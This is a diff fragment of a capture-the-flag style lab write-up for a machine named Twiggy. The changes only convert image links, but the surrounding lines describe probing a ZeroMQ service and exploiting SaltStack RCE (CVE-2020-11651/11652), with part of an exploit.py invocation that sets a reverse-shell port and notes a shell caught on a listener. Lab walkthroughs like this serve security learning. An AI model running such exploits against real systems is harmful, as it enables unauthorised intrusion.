@@ -71,11 +71,11 @@ Browsing to `http://192.168.145.62:80`:
 
 Tried some login guesses — nothing obvious.
 
-![[images/Twiggy-1744178077284.jpeg]]
+![screenshot](images/Twiggy-1744178077284.jpeg)
 
 Moved on to check `http://192.168.145.62:8000/` — it returns JSON but no content: time to do some research on ZeroMQ ZMTP 2.0 as well 
 
-![[images/Twiggy-1744178200043.jpeg]]
+![screenshot](images/Twiggy-1744178200043.jpeg)
 
 ### 🔥 Exploitation: SaltStack RCE (CVE-2020-11651 / 11652)
 
@@ -112,11 +112,11 @@ python3 exploit.py \
   --shell-LPORT 80
 ```
 
-![[images/Twiggy-1744181043545.jpeg]]
+![screenshot](images/Twiggy-1744181043545.jpeg)
 
 Shell caught on listener:
 
-![[images/Twiggy-1744181018801.jpeg]]
+![screenshot](images/Twiggy-1744181018801.jpeg)
 
 FLAG:
 ```
